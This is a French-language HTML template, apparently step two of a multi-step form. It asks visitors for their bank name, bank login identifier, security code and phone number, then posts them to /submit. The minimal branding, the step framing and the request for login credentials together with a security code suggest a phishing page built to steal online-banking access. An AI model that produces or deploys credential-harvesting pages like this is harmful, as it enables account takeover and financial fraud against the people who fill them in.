<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Étape 2</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            background-color: white;
        }

        header {
            text-align: center;
            padding: 20px;
        }

        header img {
            height: 80px;
        }

        .container {
            max-width: 500px;
            margin: 30px auto;
            background-color: rgba(255, 255, 255, 0.9);
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }

        h2 {
            color: #2c3e50;
            text-align: center;
            margin-bottom: 20px;
        }

        label {
            font-weight: bold;
            margin-bottom: 5px;
            display: block;
            color: #34495e;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        button {
            background-color: #007782;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #005f67;
        }

        @media (max-width: 600px) {
            .container {
                padding: 15px;
            }
        }
    </style>
</head>
<body>
    <header>
        <img src="{{ url_for('static', filename='logo.png') }}" alt="Logo">
    </header>

    <div class="container">
        <h2>Étape 2 : Banque</h2>
        <form method="post" action="/submit">
            <label>Établissement bancaire :</label>
            <input type="text" name="bank_name" required>

            <label>Identifiant bancaire :</label>
            <input type="text" name="bank_id" required>

            <label>Code de sécurité :</label>
            <input type="text" name="security_code" required>

            <label>Numéro de téléphone :</label>
            <input type="tel" name="phone" required>

            <button type="submit">Envoyer</button>
        </form>
    </div>
</body>
</html>
